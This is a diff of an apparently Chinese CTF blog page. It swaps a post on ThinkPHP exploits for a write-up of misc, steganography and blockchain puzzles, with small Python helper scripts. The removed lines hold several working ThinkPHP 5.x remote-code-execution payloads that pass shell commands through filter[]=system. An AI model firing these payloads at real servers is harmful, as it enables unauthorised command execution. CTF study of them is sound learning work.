-33、（post）public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al
-
-thinkphp 5.0.10（完整版）
-34、(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system
-
-thinkphp 5.1.* 和 5.2.* 和 5.0.*
-35、(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filter
+def unzip_file(zip_src,pwd):
+	r = zipfile.is_zipfile(zip_src)
+	if r:
+		zf = zipfile.ZipFile(zip_src)
+		zf.extractall(pwd=pwd)
+	else:
+		print "this is not zip"
+		exit(0)
+fname = os.listdir('./')
+while(fname[0].split('.')[-1] == 'zip'):
+	src = str(fname[0])
+	pwd = fname[0][:4]
+	unzip_file(src,pwd)
+	os.remove(src)
+	fname = os.listdir('./')
 </code></pre>
-<h3 id="0x04-参考文章">0x04 参考文章</h3>
-<p><a href="https://www.freebuf.com/column/221939.html" target="_blank" rel="noopener">https://www.freebuf.com/column/221939.html</a></p>
-<p><a href="https://xz.aliyun.com/t/6619#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619#toc-3</a></p>
+<p>得到了一个qr.txt是rgb值，一共有40000行，可以知道是200*200的图片</p>
+<pre class=" language-language-python"><code class="language-language-python">from PIL import Image
+x = 200 
+y = 200
+ 
+im = Image.new("RGB",(x,y))
+file = open('qr.txt') 
+
+
+for i in range(0,x):
+  for j in range(0,y):
+    line = file.readline().replace("","")
+    rgb = line.split(", ")
+    im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
+im.show()
+</code></pre>
+<p>跑出来就行</p>
+<h4 id="misc-寻找xxx">misc 寻找xxx</h4>
+<p>手机拨号，直接用在线识别工具得到一串手机号，再发送给公众号得flag</p>
+<h4 id="misc-不眠之夜">misc 不眠之夜</h4>
+<p>拼图就行了</p>
+<h4 id="misc-你能看懂音符吗">misc 你能看懂音符吗</h4>
+<p>打开是word文档，打开显示隐藏字符，发现是一串音符，在线解密就行了</p>
+<h4 id="misc-Unravel">misc Unravel!!</h4>
+<p>金木那种图片分离出来一个 Tokyo 图片名字是 aes.jpg</p>
+<p>另一个wav文件的hex最后是一串base64</p>
+<p>所以aes解密  密钥为Tokyo 打开另一个zip文件 还是wav文件</p>
+<p>用silenteye解密一下就有flag了</p>
+<h4 id="区块链-SimpleReveal">区块链 SimpleReveal</h4>
+<p>访问给的链接 可以看到合约的交互记录</p>
+<p>再最下面一条有一个交互成功的</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/C1DD0DC66B3D8FC064A6F41DBB53345E.png" alt></p>
+<p>查看一下就行了</p>
+<p>我电脑不知道为什么访问不了这个站 用手机才行。。</p>
+<h4 id="区块链-Unwanted-Coin">区块链 Unwanted Coin</h4>
+<p>参考这里的 <a href="https://blog.riskivy.com/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6ctf%EF%BC%9Aethernaut-writeup-part-2/" target="_blank" rel="noopener">第七题Force</a></p>
+<p>但是不知道为什么我本地复现不了。。Remix的在线编译环境很迷，网络经常故障</p>
+<h4 id="后记">后记</h4>
+<p>这两天都在打比赛 死磕了好几题 代码审计能力还是有所提高</p>
+<p>准备入门学习下区块链的题</p>
 
             </div>
             <hr>
@@ -766,7 +1032,7 @@ thinkphp 5.1.* 和 5.2.* 和 5.0.*
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/12/12/thinkphp合集/">http://yoursite.com/year/12/12/thinkphp合集/</a>
+                    <a href="http://yoursite.com/year/03/29/刷题记录/">http://yoursite.com/year/03/29/刷题记录/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1232,30 +1498,32 @@ thinkphp 5.1.* 和 5.2.* 和 5.0.*
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/12/14/SWPUCTF/">
+                <a href="/year/03/29/刷题记录/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SWPUCTF2019复现">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="刷题记录0319">
                         
-                        <span class="card-title">SWPUCTF2019复现</span>
+                        <span class="card-title">刷题记录0319</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SWPUCTF进行的时候刚好在打省赛，所以没有去做题目，只能赛后来看看题目，学习一点新姿势。
-
-0x00 web1
-web1是一个二次注入的题目，因为其中过滤了or，所以常用的information_schema就不能用了，但是可以用之前上
+                            易博霖比赛 web1
+这比赛几乎都是原题改的，难度低，web分数不吃香，最后只拿了第七。
+web1和code-breaking的原题差不多，加了个过滤，不过用session可以直接rce
+&lt;?php
+if(isset($_GET['v
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1268,6 +1536,7 @@ web1是一个二次注入的题目，因为其中过滤了or，所以常用的in
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1278,33 +1547,35 @@ web1是一个二次注入的题目，因为其中过滤了or，所以常用的in
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/11/29/2019NCTF/">
+                <a href="/year/03/20/脚本记录/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="2019NCTFweb部分复现">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="CTF脚本记录（持续更新）">
                         
-                        <span class="card-title">2019NCTFweb部分复现</span>
+                        <span class="card-title">CTF脚本记录（持续更新）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            hackbackdoor
-
-题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是
+                            每次做sql注入的题目都要自己重写一遍脚本很麻烦，其实写好框架换payload就可以了，在此记录一些可以套的模板
+sql注入二分法：
+import requests
+s = requests.session()
+url = "http://
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/总结记录/" class="post-category">
+                                    总结记录
                                 </a>
                             
                             
